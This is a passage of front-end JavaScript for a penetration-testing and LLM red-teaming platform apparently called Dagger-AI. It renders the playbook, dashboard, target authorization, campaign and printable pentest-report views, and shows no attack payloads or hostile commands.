    ? "一条端到端攻击链:7 阶段 · 每阶段的任务 · 每个任务的工具与命令。骨架以 PTES 为主干,对照 NIST SP 800-115 / Cyber Kill Chain / MITRE ATT&CK。"
    : "An end-to-end attack chain: 7 phases, each phase's tasks, and the tools & commands per task. PTES spine, cross-referenced to NIST SP 800-115 / Cyber Kill Chain / MITRE ATT&CK.";
  const authz = zh()
    ? "仅限授权测试。任何阶段开始前须有书面授权与明确范围;每次利用优先采用良性、可回滚的 PoC。"
    : "Authorized testing only. Every phase needs written authorization and a defined scope; prefer benign, reversible PoCs for any exploitation.";
  const colMap = zh()?"阶段":"Phase", colK=zh()?"本图谱":"This map";
  const fwHead = `<tr><th>${colK}</th><th>PTES</th><th>NIST 800-115</th><th>Kill Chain</th><th>MITRE ATT&amp;CK</th></tr>`;
  const fwRows = PB_FW.map(r=>`<tr><th>${esc(zh()?r[1]:r[0])}</th><td>${esc(r[2])}</td><td>${esc(r[3])}</td><td>${esc(r[4])}</td><td class="pb-src">${esc(r[5])}</td></tr>`).join("");
  main().innerHTML = `
    <h1>${title}</h1><p class="lead">${lead}</p>
    <div class="pb-authz">
      <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M12 2 4 6v6c0 5 3.5 8 8 10 4.5-2 8-5 8-10V6z"/><path d="M9 12l2 2 4-4"/></svg>
      <span>${authz}</span></div>
    <div class="pb-toolbar">
      <span class="pb-toolbar-h">${zh()?"跨框架阶段对照":"Framework alignment"}</span>
      <div class="pb-toolbar-btns">
        <button class="btn-ghost" id="pb-toggle">${zh()?"全部折叠 / 展开":"Collapse / expand all"}</button>
        <button class="btn-ghost" id="pb-export">${zh()?"导出 PDF":"Export PDF"}</button>
      </div>
    </div>
    <div class="panel pb-align"><div class="pb-align-scroll"><table class="pb-fw"><thead>${fwHead}</thead><tbody>${fwRows}</tbody></table></div></div>
    <div class="pb-spine">${PB_PHASES.map(pbPhaseHTML).join("")}</div>
    ${pbToolsHTML()}`;

  const togglePhase = ph => { const c = ph.classList.toggle("collapsed");
    ph.querySelector(".pb-head").setAttribute("aria-expanded", String(!c)); };
  main().querySelectorAll(".pb-head").forEach(h=>{
    h.addEventListener("click", ()=>togglePhase(h.closest(".pb-phase")));
    h.addEventListener("keydown", e=>{ if(e.key==="Enter"||e.key===" "){ e.preventDefault(); togglePhase(h.closest(".pb-phase")); }});
  });
  let allCol = false;
  $("#pb-toggle").onclick = ()=>{ allCol=!allCol; main().querySelectorAll(".pb-phase").forEach(ph=>{
    ph.classList.toggle("collapsed", allCol); ph.querySelector(".pb-head").setAttribute("aria-expanded", String(!allCol)); }); };

  // Export to PDF: expand every phase (so nothing is clipped), then hand off to
  // the browser's print dialog → "Save as PDF". Print CSS hides the app chrome.
  const expandAll = () => main().querySelectorAll(".pb-phase").forEach(ph=>{
    ph.classList.remove("collapsed"); ph.querySelector(".pb-head").setAttribute("aria-expanded", "true"); });
  $("#pb-export").onclick = ()=>{ allCol=false; expandAll(); setTimeout(()=>window.print(), 60); };
  window.onbeforeprint = ()=>{ if (S.view === "playbook") expandAll(); };
}

/* ---------- dashboard ---------- */
async function viewDashboard() {
  const d = await api("/dashboard");
  let tools = null; try { tools = await api("/tools/status"); } catch {}
  const sev = d.severity_totals;
  main().innerHTML = `
    <h1>${t("dashboard.title")}</h1><p class="lead">${t("dashboard.lead")}</p>
    <div class="cards">
      ${kpi(d.targets,t("kpi.targets"))}${kpi(d.campaigns,t("kpi.campaigns"))}
      ${kpi(d.runs,t("kpi.runs"))}${kpi(d.findings,t("kpi.findings"))}
    </div>
    <div class="grid2">
      <div class="panel"><h3>${t("dash.sevTitle")}</h3>${donut(sev)}</div>
      <div class="panel"><h3>${t("dash.domainTitle")}</h3>${domainSplit(d)}</div>
    </div>
    <div class="grid2">
      <div class="panel"><h3>${t("dash.llmTitle")}</h3>${owaspBars(d.owasp_llm_hits)}</div>
      <div class="panel"><h3>${t("dash.webTitle")}</h3>${owaspBars(d.owasp_web_hits)}</div>
    </div>
    <div class="grid2">
      <div class="panel"><h3>${t("dash.toolRunner")}</h3>${toolStatus(tools)}</div>
      <div class="panel"><h3>${t("usage.title")}</h3>${usagePanel(d.llm_usage)}</div>
    </div>
    <div class="panel"><h3>${t("dash.recent")}</h3>${runsTable(d.recent_runs)}</div>`;
  bindRunRows();
}
function toolStatus(tl){
  if(!tl || !tl.tools || !Object.keys(tl.tools).length)
    return `<div class="no" style="font-size:13px">${t("dash.toolDown")}</div>`;
  return `<div class="row" style="gap:8px;flex-wrap:wrap">`+Object.entries(tl.tools).map(([k,v])=>
    `<span class="tag" style="border-color:${v?'var(--ok)':'var(--line)'};color:${v?'var(--ok)':'var(--muted)'}">`
    + (v?'✔':'✗') + ` ${k}</span>`).join("")+`</div>
    <p class="no" style="font-size:12px;margin-top:8px">${t("dash.toolNote")}</p>`;
}
function domainSplit(d){
  const llm=Object.values(d.owasp_llm_hits).reduce((a,b)=>a+b,0);
  const web=Object.values(d.owasp_web_hits).reduce((a,b)=>a+b,0);
  const tot=Math.max(1,llm+web);
  return `<div style="padding:8px 0">
    <div class="spread"><span>🤖 ${t("dash.llmSystems")}</span><b>${llm}</b></div>
    <div class="bar"><i style="width:${llm/tot*100}%"></i></div>
    <div class="spread" style="margin-top:14px"><span>🌐 ${t("dash.webApps")}</span><b>${web}</b></div>
    <div class="bar"><i style="width:${web/tot*100}%;background:linear-gradient(90deg,var(--high),var(--med))"></i></div>
    <p class="no" style="font-size:12px;margin-top:14px">${t("dash.domainNote")}</p></div>`;
}
const kpi = (n,l) => `<div class="card kpi"><div class="n">${n}</div><div class="l">${l}</div></div>`;

function usagePanel(u){
  u=u||{};
  if(!u.total_tokens) return `<div class="no" style="font-size:13px;padding:6px 0">${t("usage.none")}</div>`;
  return `<div class="usage" style="padding:6px 0">
    <span><b>${(u.total_tokens||0).toLocaleString()}</b> ${t("usage.tokens")}</span>
    <span class="ucost">~$${(u.cost_usd||0).toFixed(4)}</span>
    <span><b>${u.calls||0}</b> ${t("usage.calls")}</span></div>
    <p class="no" style="font-size:11px;margin-top:8px">${t("usage.est")}</p>`;
}
function usageInline(u){
  u=u||{}; if(!u.total_tokens) return "";
  return ` · <span class="usage" style="display:inline-flex"><b>${(u.total_tokens||0).toLocaleString()}</b> ${t("usage.tokens")}
    <span class="ucost">~$${(u.cost_usd||0).toFixed(4)}</span></span>`;
}

function donut(sev) {
  const order=["critical","high","medium","low","info"];
  const col={critical:"var(--crit)",high:"var(--high)",medium:"var(--med)",low:"var(--low)",info:"var(--info)"};
  const total = order.reduce((s,k)=>s+(sev[k]||0),0);
  let off=0, segs="";
  const C=2*Math.PI*52;
  order.forEach(k=>{ const v=sev[k]||0; if(!v)return; const frac=v/total;
    segs+=`<circle r="52" cx="70" cy="70" fill="none" stroke="${col[k]}" stroke-width="18"
      stroke-dasharray="${frac*C} ${C}" stroke-dashoffset="${-off*C}" transform="rotate(-90 70 70)"/>`;
    off+=frac; });
  const legend = order.map(k=>`<div class="spread" style="margin:4px 0">
    <span><span class="badge sev-${k}">${sevLabel(k)}</span></span><b>${sev[k]||0}</b></div>`).join("");
  return `<div class="row donut" style="align-items:center;gap:26px">
    <svg width="140" height="140" viewBox="0 0 140 140">${segs||
      `<circle r="52" cx="70" cy="70" fill="none" stroke="var(--line)" stroke-width="18"/>`}
      <text x="70" y="66" text-anchor="middle" font-size="26" font-weight="800">${total}</text>
      <text x="70" y="86" text-anchor="middle" font-size="11" class="sub">${t("donut.findings")}</text></svg>
    <div style="flex:1;min-width:160px">${legend}</div></div>`;
}
function owaspBars(hits) {
  const max = Math.max(1, ...Object.values(hits));
  return Object.entries(hits).map(([k,n])=>`<div style="margin:9px 0"><div class="spread">
      <span style="font-size:12px"><span class="tag">${k}</span> ${esc(owaspLabel(k))}</span><b>${n}</b></div>
      <div class="bar"><i style="width:${n/max*100}%"></i></div></div>`).join("");
}

/* ---------- targets ---------- */
async function viewTargets() {
  const ts = await api("/targets");
  main().innerHTML = `
    <div class="spread"><div><h1>${t("targets.title")}</h1><p class="lead">${t("targets.lead")}</p></div>
      <div class="row"><button class="ghost" id="add-demo-host">${t("targets.addDemoHost")}</button>
      <button class="ghost" id="add-demo-web">${t("targets.addDemoWeb")}</button>
      <button class="ghost" id="add-demo">${t("targets.addDemo")}</button>
      <button id="add-target">${t("targets.new")}</button></div></div>
    <div class="warn">${t("targets.warn")}
      ${S.meta.require_authorization ? t("targets.authEach") : ""}</div>
    <div class="panel">${ts.length? `<table><thead><tr><th>${t("col.name")}</th><th>${t("col.kind")}</th>
      <th>${t("col.endpoint")}</th><th>${t("col.authorized")}</th><th></th></tr></thead><tbody>
      ${ts.map(x=>`<tr><td><b>${esc(x.name)}</b></td><td><span class="tag">${x.kind}</span></td>
        <td class="mono" style="font-size:12px">${esc(x.endpoint||"—")}</td>
        <td>${x.authorized?`<span class="ok">✔ ${t("common.yes")}</span>`:`<span class="no">✗ ${t("common.no")}</span>`}</td>
        <td style="text-align:right">
          <button class="sm ghost" data-report="${x.id}">${t("targets.report")}</button>
          <button class="sm ghost" data-export="${x.id}">${t("targets.export")}</button>
          <button class="sm ghost" data-prof="${x.id}">${t("targets.bom")}</button>
          <button class="sm ghost" data-edit="${x.id}">${t("common.edit")}</button>
          ${x.authorized?"":`<button class="sm ghost" data-auth="${x.id}">${t("common.authorize")}</button>`}
          <button class="sm danger" data-del="${x.id}">${t("common.delete")}</button></td></tr>`).join("")}
      </tbody></table>`: `<div class="empty">${t("targets.empty")}</div>`}
    </div>`;
  $("#add-demo").onclick = async () => { await api("/targets/demo",{method:"POST"});
    toast(t("targets.demoRegistered")); viewTargets(); };
  $("#add-demo-web").onclick = async () => { await api("/targets/demo_web",{method:"POST"});
    toast(t("targets.demoWebRegistered")); viewTargets(); };
  $("#add-demo-host").onclick = async () => { await api("/targets/demo_host",{method:"POST"});
    toast(t("targets.demoHostRegistered")); viewTargets(); };
  $("#add-target").onclick = targetForm;
  main().querySelectorAll("[data-del]").forEach(b=>b.onclick=async()=>{
    await api("/targets/"+b.dataset.del,{method:"DELETE"}); viewTargets(); });
  main().querySelectorAll("[data-auth]").forEach(b=>b.onclick=()=>authorizeForm(b.dataset.auth));
  main().querySelectorAll("[data-edit]").forEach(b=>b.onclick=()=>targetForm(ts.find(x=>x.id==b.dataset.edit)));
  main().querySelectorAll("[data-prof]").forEach(b=>b.onclick=()=>openProfile(b.dataset.prof));
  main().querySelectorAll("[data-report]").forEach(b=>b.onclick=()=>openReport(b.dataset.report));
  main().querySelectorAll("[data-export]").forEach(b=>b.onclick=()=>exportMenu(b.dataset.export));
}

/* ---------- report export (Markdown / JSON / SARIF), authed download ---------- */
async function downloadReport(id, fmt){
  const q = fmt==="md" ? ("?lang="+(zh()?"zh":"en")) : "";
  try{
    const r = await fetch(`/api/targets/${id}/report.${fmt}${q}`,
      {headers:{"Authorization":"Bearer "+S.token}});
    if(r.status===401){ logout(); return; }
    if(!r.ok) throw new Error(r.statusText||"export failed");
    const blob = await r.blob();
    const m = /filename="([^"]+)"/.exec(r.headers.get("Content-Disposition")||"");
    const url = URL.createObjectURL(blob);
    const a = document.createElement("a");
    a.href=url; a.download = m?m[1]:`dagger-report.${fmt}`;
    document.body.appendChild(a); a.click(); a.remove();
    setTimeout(()=>URL.revokeObjectURL(url),30000);
    toast(t("report.exported",{f:fmt.toUpperCase()}));
  }catch(e){ toast(e.message); }
}
function exportMenu(id){
  openDrawer(`<span class="close-x" onclick="closeDrawer()">×</span>
    <h2>${t("report.exportTitle")}</h2>
    <p class="note" style="color:var(--muted);margin:6px 0 16px">${t("report.exportHint")}</p>
    <div class="row" style="gap:10px;flex-wrap:wrap">
      <button class="exp" data-f="md">Markdown · .md</button>
      <button class="exp" data-f="json">JSON · .json</button>
      <button class="exp" data-f="sarif">SARIF · .sarif</button>
    </div>`);
  $("#drawer").querySelectorAll(".exp").forEach(b=>b.onclick=()=>downloadReport(id,b.dataset.f));
}

/* ---------- per-target pentest report (printable / save-as-PDF) ---------- */
async function openReport(id){
  let p, cs, rs;
  try{ [p,cs,rs]=await Promise.all([api(`/targets/${id}/profile`),api("/campaigns"),api("/runs")]); }
  catch(e){ toast(e.message); return; }
  const campIds=new Set(cs.filter(c=>String(c.target_id)===String(id)).map(c=>c.id));
  const runs=rs.filter(r=>campIds.has(r.campaign_id))
               .sort((a,b)=>(b.started_at||"").localeCompare(a.started_at||""));
  const blob=new Blob([reportHtml(p, runs)],{type:"text/html;charset=utf-8"});
  const url=URL.createObjectURL(blob);
  const w=window.open(url,"_blank");
  if(!w){   // popups blocked → download the report instead
    const a=document.createElement("a");
    a.href=url; a.download=("dagger-report-"+(p.target.name||"target")+".html").replace(/[^\w.\-]+/g,"_");
    document.body.appendChild(a); a.click(); a.remove();
    toast(t("report.downloaded"));
  }
  setTimeout(()=>URL.revokeObjectURL(url), 60000);
}
function reportHtml(p, runs){
  const E=esc, sv=p.findings_by_sev||{}, order=["critical","high","medium","low","info"];
  const SEVC={critical:"#c62828",high:"#e65100",medium:"#f9a825",low:"#1565c0",info:"#616161"};
  const sevChip=s=>`<span class="sc" style="background:${SEVC[s]||'#616161'}">${E(sevLabel(s))}</span>`;
  const total=Object.values(sv).reduce((a,b)=>a+b,0);
  const worst=order.find(s=>sv[s])||null;

  // Severity distribution: a proportional bar + a per-severity count table.
  const sevBar=total?`<div class="bar">${order.filter(s=>sv[s]).map(s=>
      `<span class="seg" style="flex:${sv[s]};background:${SEVC[s]}" title="${E(sevLabel(s))}: ${sv[s]}"></span>`).join("")}</div>
    <table class="sg"><tbody>${order.filter(s=>sv[s]).map(s=>
      `<tr><td>${sevChip(s)}</td><td class="n">${sv[s]}</td></tr>`).join("")}
      <tr class="tot"><td>${t("report.totalFindings")}</td><td class="n">${total}</td></tr></tbody></table>`
    :`<p class="ok">${t("run.noFindings")}</p>`;

  // Executive summary: the operator's written analysis when present, else a
  // deterministic sentence. Risk posture line keys off the worst severity.
  const execProse=p.exec_summary?mdToHtml(p.exec_summary)
    :`<p>${t("report.summaryText",{n:total,t:E(p.target.name)})}</p>`;
  const posture=worst?`<div class="posture p-${worst}">${t("report.posture")}: <b>${E(sevLabel(worst))}</b></div>`:"";

  // Findings — stable IDs (F-01…), severity, OWASP/ATLAS, evidence, remediation.
  const pad=n=>String(n).padStart(2,"0");
  const vulns=(p.vulnerabilities||[]).map((v,i)=>`
    <div class="v">
      <div class="vh"><span class="fid">F-${pad(i+1)}</span> ${sevChip(v.severity)}
        ${v.cvss>0?`<span class="sc" style="background:#374151">CVSS ${(+v.cvss).toFixed(1)}</span>`:""} <b>${E(v.title)}</b>
        ${v.count>1?`<span class="x">×${v.count}</span>`:""} ${v.cwe?`<span class="tg">${E(v.cwe)}</span>`:""}${v.owasp?`<span class="tg">${E(v.owasp)}</span>`:""}
        ${v.atlas?`<span class="tg">${E(v.atlas)}</span>`:""}</div>
      ${v.cvss_vector?`<div class="vl">CVSS</div><pre>${E(v.cvss_vector)}</pre>`:""}
      ${v.description?`<div class="vd">${E(v.description)}</div>`:""}
      ${v.evidence?`<div class="vl">${t("finding.evidence")}</div><pre>${E(v.evidence)}</pre>`:""}
      ${v.remediation?`<div class="vl">${t("finding.remediation")}</div><div class="vr">${E(v.remediation)}</div>`:""}
    </div>`).join("")||`<p class="ok">${t("run.noFindings")}</p>`;

  const row=(k,val)=>val&&val.length?`<tr><th>${E(k)}</th><td>${Array.isArray(val)?val.map(E).join("、"):E(val)}</td></tr>`:"";
  const comps=(p.components||[]).map(c=>`${c.name}${c.version?" "+c.version:""}`);
  const ports=(p.ports||[]).map(x=>`${x.port}/${x.proto} ${x.service}${x.product?" ("+x.product+")":""}`);

  // Scope & authorization.
  const tg=p.target||{}, authed=tg.authorized;
  const windowTxt=p.first_seen?E(fmtDate(p.first_seen))+(p.last_seen&&p.last_seen!==p.first_seen?" – "+E(fmtDate(p.last_seen)):"")
    :(p.last_seen?E(fmtDate(p.last_seen)):"—");
  const ref=`DA-${tg.id||"?"}-${new Date().toISOString().slice(0,10).replace(/-/g,"")}`;
  const scope=`<table>
    ${row(t("col.name"),tg.name)}${row(t("report.scopeKind"),tg.kind)}${row(t("col.endpoint"),p.endpoint)}
    <tr><th>${t("report.scopeAuthorized")}</th><td>${authed?`<span class="ok-tag">✔ ${t("report.authorizedYes")}</span>`:`<span class="no-tag">✘ ${t("report.authorizedNo")}</span>`}</td></tr>
    ${row(t("report.scopeNote"),tg.authorization_note)}${row(t("report.window"),windowTxt)}
    ${row(t("bom.engagements"),String(p.runs))}</table>`;

  // Methodology — kill-chain phases actually exercised.
  const phases=(p.phases||[]);
  const methodology=phases.length
    ?`<div class="chips">${phases.map(ph=>`<span class="ph">${E(phaseLabel(ph))}</span>`).join("")}</div>
      <p class="note">${t("report.methodologyText")}</p>`
    :`<p class="note">${t("report.methodologyText")}</p>`;

  const timeline=runs.length?`<table class="tl"><thead><tr><th>${t("col.run")}</th><th>${t("col.status")}</th>
      <th>${t("col.attempts")}</th><th>${t("col.successes")}</th><th>${t("col.worst")}</th><th>${t("col.started")}</th></tr></thead><tbody>
      ${runs.map(r=>{const s=r.summary||{};return `<tr><td>#${r.id}</td><td>${E(statusLabel(r.status))}</td>
        <td>${s.attempts??"—"}</td><td>${s.successes??"—"}</td><td>${s.worst?E(sevLabel(s.worst)):"—"}</td>
        <td>${E(fmtDate(r.started_at))}</td></tr>`;}).join("")}</tbody></table>`:`<p>—</p>`;

  return `<!doctype html><html lang="${I18N.getLang()}"><head><meta charset="utf-8">
    <title>${t("report.title")} — ${E(p.target.name)}</title><style>
    *{box-sizing:border-box}body{font-family:-apple-system,"Segoe UI","PingFang SC","Microsoft YaHei",sans-serif;
      color:#1a1a1a;max-width:860px;margin:0 auto;padding:40px 32px;line-height:1.55;font-size:14px}
    h1{font-size:24px;margin:0 0 4px}h2{font-size:16px;margin:28px 0 10px;border-bottom:2px solid #eee;padding-bottom:6px}
    .conf{background:#fbeaea;border:1px solid #f0c7c7;color:#a5302a;font-size:11px;font-weight:700;letter-spacing:.06em;
      text-transform:uppercase;text-align:center;border-radius:6px;padding:6px 10px;margin:0 0 16px}
    .meta{color:#666;font-size:13px;margin-bottom:6px}.sum{background:#f6f8fa;border:1px solid #e3e8ee;border-radius:8px;padding:14px 16px;margin:10px 0}
    .sum p{margin:0 0 8px}.sum p:last-child{margin-bottom:0}
    .posture{display:inline-block;font-size:13px;font-weight:600;border-radius:6px;padding:4px 10px;margin:2px 0 10px;background:#eef1f5}
    .p-critical{background:#fbeaea;color:#c62828}.p-high{background:#fdeee0;color:#e65100}.p-medium{background:#fdf6e3;color:#b58900}
    .p-low{background:#e8f0fb;color:#1565c0}.p-info{background:#eef1f5;color:#555}
    .bar{display:flex;height:14px;border-radius:7px;overflow:hidden;margin:4px 0 10px}.seg{display:block}
    table{width:100%;border-collapse:collapse;margin:6px 0}th,td{text-align:left;padding:7px 9px;border-bottom:1px solid #eee;font-size:13px;vertical-align:top}
    th{color:#555;width:160px;font-weight:600}.tl th,.sg th{width:auto}.sg{max-width:260px}.sg .n{text-align:right;font-variant-numeric:tabular-nums}
    .sg .tot td{font-weight:700;border-top:1px solid #ddd}
    .v{border:1px solid #e3e8ee;border-radius:8px;padding:12px 14px;margin:10px 0}.vh{font-size:14px}.vh b{margin:0 4px}
    .fid{font-family:monospace;font-size:12px;font-weight:700;color:#3b63e0;margin-right:4px}
    .sc{display:inline-block;padding:1px 8px;border-radius:12px;font-size:11px;font-weight:700;color:#fff}
    .vd{color:#444;font-size:13px;margin:7px 0}.vl{font-size:11px;text-transform:uppercase;letter-spacing:.04em;color:#888;margin:8px 0 3px}
    .vr{font-size:13px}.x,.tg{display:inline-block;background:#eef1f5;border-radius:5px;padding:1px 6px;font-size:11px;color:#555;font-family:monospace}
    .chips{display:flex;flex-wrap:wrap;gap:6px;margin:4px 0 8px}.ph{background:#eef1f5;border-radius:5px;padding:2px 9px;font-size:12px;color:#444}
    .note{color:#666;font-size:12px;margin:6px 0 0}.ok{color:#1a7f37}.ok-tag{color:#1a7f37;font-weight:600}.no-tag{color:#c62828;font-weight:600}
    .md-h{font-weight:700;margin:8px 0 2px}.sum ul,.sum ol{margin:4px 0 8px 20px;padding:0}.sum li{margin:2px 0}
    pre{background:#f6f8fa;border:1px solid #e3e8ee;border-radius:6px;padding:9px;font-size:12px;white-space:pre-wrap;word-break:break-word;margin:0}
    code{background:#eef1f5;border-radius:4px;padding:1px 4px;font-size:12px}
    .noprint{margin:18px 0}button{padding:8px 16px;border:none;border-radius:7px;background:#3b63e0;color:#fff;font-weight:600;cursor:pointer}
    @media print{.noprint{display:none}body{padding:0;max-width:none}.v,.sum{break-inside:avoid}}
    </style></head><body>
    <div class="noprint"><button onclick="window.print()">${t("report.print")}</button></div>
    <div class="conf">${t("report.classification")}</div>
    <h1>${t("report.title")}</h1>
    <div class="meta"><b>${E(p.target.name)}</b> · ${E(p.endpoint||"—")}</div>
    <div class="meta">${t("report.ref")}: ${ref} · ${t("report.generated")}: ${E(new Date().toLocaleString(zh()?"zh-CN":undefined))}</div>
    <h2>${t("report.scope")}</h2>${scope}
    <h2>${t("report.summary")}</h2>
    ${posture}
    <div class="sum">${execProse}</div>
    <div class="vl">${t("report.sevDist")}</div>${sevBar}
    <h2>${t("report.findings")} (${(p.vulnerabilities||[]).length})</h2>${vulns}
    <h2>${t("report.methodology")}</h2>${methodology}
    <h2>${t("profile.assets")}</h2>
    <table>${row(t("bom.webServer"),p.web_servers&&p.web_servers.length?p.web_servers:p.powered_by)}
      ${row(t("bom.os"),p.os)}${row(t("bom.ports"),ports)}${row(t("bom.components"),comps)}
      ${row(t("bom.paths")+" ("+(p.paths||[]).length+")",(p.paths||[]).slice(0,40))}${row(t("bom.endpoints"),p.endpoints)}</table>
    <h2>${t("report.timeline")}</h2>${timeline}
    <div class="meta" style="margin-top:30px;border-top:1px solid #eee;padding-top:12px">Dagger-AI · ${E(ref)} · ${t("login.legal")}</div>
    </body></html>`;
}

async function openProfile(id){
  let p; try{ p=await api(`/targets/${id}/profile`); }catch(e){ toast(e.message); return; }
  const chips=a=>a.length?a.map(s=>`<span class="tag">${esc(s)}</span>`).join(" "):`<span class="no">—</span>`;
  const sec=(title,body)=>`<div class="lab" style="margin-top:14px">${title}</div>${body}`;
  const secIf=(title,arr,count)=>{ const a=arr||[]; return a.length
    ? sec(title+(count?` (${a.length})`:""),chips(a)) : ""; };
  const ports=p.ports.length?`<table><thead><tr><th>${t("bom.port")}</th><th>${t("bom.service")}</th>
      <th>${t("bom.product")}</th></tr></thead><tbody>${p.ports.map(x=>`<tr>
      <td class="mono">${x.port}/${x.proto}</td><td>${esc(x.service)}</td>
      <td class="mono" style="font-size:12px">${esc(x.product||"—")}</td></tr>`).join("")}</tbody></table>`
    :`<span class="no">—</span>`;
  const comps=p.components.length?`<div class="row" style="gap:6px;flex-wrap:wrap">${p.components.map(c=>
      `<span class="tag">${esc(c.name)}${c.version?" "+esc(c.version):""}</span>`).join("")}</div>`:`<span class="no">—</span>`;
  const paths=p.paths.length?`<div class="scrollbox" style="max-height:160px">${p.paths.map(x=>
      `<div class="mono" style="font-size:12px;padding:2px 0">${esc(x)}</div>`).join("")}</div>`:`<span class="no">—</span>`;
  const web=p.web_servers.length?chips(p.web_servers):chips(p.powered_by);
  const sevline=Object.entries(p.findings_by_sev||{}).sort((a,b)=>sevScore(b[0])-sevScore(a[0]))
      .map(([s,n])=>`<span class="badge sev-${s}">${sevLabel(s)} ${n}</span>`).join(" ")||`<span class="no">—</span>`;
  const vulns=(p.vulnerabilities||[]).map(v=>`
      <div class="vuln">
        <div class="vuln-h"><span class="badge sev-${v.severity}">${sevLabel(v.severity)}</span>
          <b>${esc(v.title)}</b>${v.count>1?`<span class="tag">×${v.count}</span>`:""}
          ${v.owasp?`<span class="tag">${v.owasp}</span>`:""}${v.atlas?`<span class="tag">${v.atlas}</span>`:""}</div>
        ${v.remediation?`<div class="vuln-fix"><b>${t("profile.remediation")}:</b> ${esc(v.remediation)}</div>`:""}
      </div>`).join("")||`<div class="ok" style="font-size:13px">${t("run.noFindings")}</div>`;
  openDrawer(`<span class="close-x" onclick="closeDrawer()">×</span>
    <h2>${esc(p.target.name)} <span class="tag">${p.target.kind}</span></h2>
    <div class="pb-note">${esc(p.endpoint||"—")} · ${p.runs} ${t("bom.engagements")} ·
      ${sevline}${p.last_seen?" · "+fmtDate(p.last_seen):""}</div>
    <div class="lab" style="margin-top:6px">${t("profile.vulns")} (${(p.vulnerabilities||[]).length})</div>${vulns}
    <div class="lab" style="margin-top:18px;border-top:1px solid var(--line);padding-top:14px">${t("profile.assets")}</div>
    ${sec(t("bom.ports"),ports)}
    ${sec(t("bom.os"),chips(p.os))}
    ${sec(t("bom.webServer"),web)}
    ${sec(t("bom.components")+` (${p.components.length})`,comps)}
    ${secIf(t("bom.waf"),p.waf)}
    ${secIf(t("bom.tls"),p.tls_issues)}
    ${secIf(t("bom.subdomains"),p.subdomains,true)}
    ${secIf(t("bom.cves"),p.cves,true)}
    ${secIf(t("bom.emails"),p.emails,true)}
    ${sec(t("bom.paths")+` (${p.paths.length})`,paths)}
    ${sec(t("bom.endpoints"),chips(p.endpoints))}`);
}

function targetForm(existing) {
  const ed = existing && existing.id;
  openDrawer(`<h2>${ed?t("targetForm.editTitle"):t("targetForm.title")}</h2>
    <label>${t("form.type")}</label>
    <select id="t-kind">
      <option value="host">${t("form.kindHost")}</option>
      <option value="web_app">${t("form.kindWebBuiltin")}</option>
      <option value="http_chat">${t("form.kindChat")}</option>
    </select>
    <label>${t("form.name")}</label><input id="t-name" placeholder="My app (staging)">
    <label id="ep-lab">${t("form.targetHostUrl")}</label>
    <input id="t-ep" placeholder="${t("form.hostPh")}">
    <div id="chat-fields">
      <label>${t("form.method")}</label><input id="t-method" value="POST">
      <label>${t("form.bodyTpl")} <span class="no">${t("form.bodyHint")}</span></label>
      <textarea id="t-body" rows="4">{"model":"your-model","messages":[{"role":"user","content":"{{PROMPT}}"}]}</textarea>
      <label>${t("form.respPath")} <span class="no">${t("form.respHint")}</span></label>
      <input id="t-path" value="choices.0.message.content">
    </div>
    <div class="row" style="margin-top:18px"><button id="t-save">${ed?t("common.save"):t("common.create")}</button>
      <button class="ghost" onclick="closeDrawer()">${t("common.cancel")}</button></div>`);
  const sync=()=>{ const k=$("#t-kind").value; const chat=k==="http_chat";
    $("#chat-fields").style.display=chat?"block":"none";
    $("#ep-lab").textContent = k==="host" ? t("form.targetHostUrl")
      : k==="web_app" ? t("form.baseUrl") : t("form.endpoint");
    $("#t-ep").placeholder = k==="host" ? t("form.hostPh")
      : k==="web_app" ? "https://app.example.com" : "https://host/v1/chat/completions"; };
  if(ed){   // prefill from the existing target
    $("#t-kind").value = existing.kind; $("#t-name").value = existing.name||"";
    $("#t-ep").value = existing.endpoint||"";
    if($("#t-method")) $("#t-method").value = existing.http_method||"POST";
    if($("#t-body")) $("#t-body").value = existing.body_template||"";
    if($("#t-path")) $("#t-path").value = existing.response_path||"";
  }
  $("#t-kind").onchange=sync; sync();
  $("#t-save").onclick = async () => {
    const chat=$("#t-kind").value==="http_chat";
    const body = {
      name:$("#t-name").value, kind:$("#t-kind").value, endpoint:$("#t-ep").value,
      http_method: chat?$("#t-method").value:"GET",
      body_template: chat?$("#t-body").value:"",
      response_path: chat?$("#t-path").value:"" };
    try{
      await api(ed?`/targets/${existing.id}`:"/targets",
                {method: ed?"PATCH":"POST", body:JSON.stringify(body)});
      closeDrawer(); viewTargets(); toast(ed?t("toast.targetUpdated"):t("toast.targetCreated")); }
    catch(e){ toast(e.message); }
  };
}
function authorizeForm(id){
  openDrawer(`<h2>${t("authForm.title")}</h2>
    <div class="warn">${t("authForm.warn")}</div>
    <label>${t("authForm.note")}</label>
    <textarea id="a-note" rows="4" placeholder="${t("authForm.notePh")}"></textarea>
    <div class="row" style="margin-top:16px"><button id="a-save">${t("authForm.confirm")}</button>
      <button class="ghost" onclick="closeDrawer()">${t("common.cancel")}</button></div>`);
  $("#a-save").onclick = async () => {
    try{ await api(`/targets/${id}/authorize`,{method:"POST",body:JSON.stringify({note:$("#a-note").value})});
      closeDrawer(); viewTargets(); toast(t("toast.targetAuthorized")); }
    catch(e){ toast(e.message); }
  };
}

/* ---------- campaigns ---------- */
async function viewCampaigns() {
  const [cs, ts] = await Promise.all([api("/campaigns"), api("/targets")]);
  const tmap = Object.fromEntries(ts.map(x=>[x.id,x]));
  main().innerHTML = `
    <div class="spread"><div><h1>${t("campaigns.title")}</h1><p class="lead">${t("campaigns.lead")}</p></div>
      <button id="new-camp">${t("campaigns.new")}</button></div>
    <div class="panel">${cs.length? `<table><thead><tr><th>${t("col.name")}</th><th>${t("col.target")}</th>
      <th>${t("col.probes")}</th><th>${t("col.strategy")}</th><th></th></tr></thead><tbody>
      ${cs.map(c=>`<tr><td><b>${esc(c.name)}</b></td>
        <td>${esc(tmap[c.target_id]?.name||"—")}</td>
        <td>${(c.probes||[]).map(p=>`<span class="tag">${p}</span>`).join(" ")}</td>
        <td>${esc(strategyLabel(c.orchestrator))}</td>
        <td style="text-align:right"><button class="sm" data-run="${c.id}">▶ ${t("common.run")}</button>
          <button class="sm ghost" data-edit="${c.id}">${t("common.edit")}</button>
          <button class="sm danger" data-del="${c.id}">${t("common.delete")}</button></td></tr>`).join("")}
      </tbody></table>`:`<div class="empty">${t("campaigns.empty")}</div>`}</div>`;
  $("#new-camp").onclick = () => campaignForm(ts);
  main().querySelectorAll("[data-edit]").forEach(b=>b.onclick=()=>campaignForm(ts, cs.find(c=>c.id==b.dataset.edit)));
